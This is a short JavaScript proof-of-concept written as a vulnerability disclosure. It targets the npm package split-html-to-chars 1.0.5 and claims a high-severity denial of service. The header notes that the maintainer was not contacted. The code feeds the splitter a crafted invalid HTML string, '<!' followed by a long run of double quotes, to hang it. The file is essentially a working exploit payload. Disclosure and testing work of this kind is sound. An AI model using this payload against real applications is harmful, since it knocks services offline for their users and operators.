/**
 * split-html-to-chars@1.0.5
 * Package Manager: npm
 * Link to published package: https://github.com/akella/split-html-to-chars
 * Link to GitHub repo: https://github.com/akella/split-html-to-chars
 * Severity level: High
 * Module Description: Split html to letters for animation
 * Additional Info: It allows cause a denial of service when splitting crafted invalid htmls.
 * Contacted maintainer?: No
 * Open issue?: No
 */

var Splitter = require("split-html-to-chars/index.js")
Splitter('<!""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""!', '$', '<span class="word">$</span>')